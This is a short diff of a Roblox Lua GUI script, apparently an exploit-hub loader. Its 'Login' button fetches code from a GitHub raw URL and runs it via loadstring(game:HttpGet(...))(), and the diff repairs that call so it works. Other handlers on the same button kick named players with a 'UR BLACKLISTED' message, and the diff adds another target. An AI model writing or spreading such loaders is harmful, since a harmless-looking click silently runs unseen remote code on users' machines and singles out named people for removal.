@@ -29,11 +29,14 @@ LogIn.Text = "Login"
 LogIn.TextColor3 = Color3.fromRGB(0, 0, 0)
 LogIn.TextSize = 70.000
 LogIn.MouseButton1Down:connect(function()
-loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/BOBINYOURFLOP/BOBINYOURFLOP/main/%3AD"))()"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BOBINYOURFLOP/BOBINYOURFLOP/main/%3AD"))()
 main.Visible = false
 end)
 LogIn.MouseButton1Down:connect(function()
-game.Players.MatthiasHD22:Kick("UR BLACKLISTED")
+game.Players.MattiasHD22:Kick("UR BLACKLISTED")
+end)
+LogIn.MouseButton1Down:connect(function()
+game.Players.MatthiasHD22YT:Kick("UR BLACKLISTED")
 end)
 LogIn.MouseButton1Down:connect(function()
 game.Players.kinderpopo:Kick("UR BLACKLISTED")
